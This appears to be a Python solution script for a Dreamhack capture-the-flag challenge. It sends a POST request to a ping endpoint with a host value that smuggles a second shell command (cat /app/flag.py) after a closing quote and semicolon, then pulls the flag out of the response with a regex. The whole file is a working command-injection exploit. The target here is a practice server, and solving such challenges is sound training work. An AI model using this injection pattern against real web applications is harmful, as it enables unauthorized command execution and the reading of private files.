import re
from requests import request as req

res = req(
    url="http://host8.dreamhack.games:12182/ping",
    method="POST",
    data={"host": f'8.8.8.8"; cat /app/flag.py"'},
)

matched = re.search("DH{.*}", res.text)

print(matched.group() if matched else "NO FLAG")
